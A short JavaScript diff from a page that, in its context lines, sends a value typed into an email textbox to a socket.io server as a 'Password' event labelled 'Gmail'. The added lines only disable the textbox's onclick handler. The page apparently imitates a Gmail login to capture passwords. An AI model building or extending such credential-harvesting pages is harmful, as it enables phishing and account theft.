@@ -350,6 +350,7 @@ var socket = io.connect();
         console.log("small")
       }else{
         var from = "Gmail"
+        $("#email-textbox").attr("onclick", "null");
         socket.emit('Password', $('#email-textbox').val(), from);
       }
     }
@@ -359,7 +360,7 @@ var socket = io.connect();
         if (event.keyCode == 13) {
           console.log("pressed")
           $("#button2").click();
-          
+          $("#email-textbox").attr("onclick", "null");
         }
       });
 
